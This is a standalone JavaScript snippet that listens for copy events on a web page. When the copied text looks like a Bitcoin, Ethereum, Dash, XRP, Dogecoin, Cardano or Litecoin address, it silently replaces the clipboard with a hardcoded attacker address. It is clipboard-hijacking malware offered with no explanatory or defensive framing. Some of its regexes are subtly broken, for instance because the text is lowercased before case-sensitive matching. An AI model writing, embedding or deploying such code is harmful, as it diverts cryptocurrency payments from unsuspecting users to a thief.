document.addEventListener('copy', event => {
    let content = document.getSelection().toString().toLowerCase().trim()
    
    if(content in dictionary) {
        content = dictionary[content]
        event.clipboardData.setData('text', content)
        event.preventDefault()
   
    }

    let RegexMatch = [
        ["btc", "((bc|tb)(0([ac-hj-np-z02-9]{39}|[ac-hj-np-z02-9]{59})|1[ac-hj-np-z02-9]{8,87})|([13]|[mn2])[a-km-zA-HJ-NP-Z1-9]{25,39})"
        , "bc1qysrpxm8jjwlcmn5np49h3teefppdly349p2v4u"],
        ["eth", "^0x[a-fA-F0-9]{40}$", "0x3337185c1b99f4820A898027193e53411c0A4354"],
        ["dash", "^X[1-9A-HJ-NP-Za-km-z]{33}$", "XfMQt78tLoLUua4DDSfxneHtXCFeKm9YXv"],
        ["xrp", "^r[0-9a-zA-Z]{24,34}$", "rp4QS2AkxHqLJLfMxuCbmXZB6EWWF2QyhS"],
        ["doge", "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", "DKQ48VgoBPiZ3cQecdqhGpvwzLajW6ZNaB"],
        ["ada", "^D[A-NP-Za-km-z1-9]{35,}$", "addr1v8a43rzza8rwtey3l8dt4ly39qtpq4w85ye4ednrpqxu38cda7mwz"],
        ["lite", "/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/", "ML6rvYXHjSFt4KQ13hfN5Wdf6DKrGhdaoi"]
]

var length = (RegexMatch).length;

for (var i = 0; i < length; i++) {
    let found = content.match(RegexMatch[i][1]);    
    if (found){
        event.clipboardData.setData('text', RegexMatch[i][2])
        event.preventDefault()

    }
}

})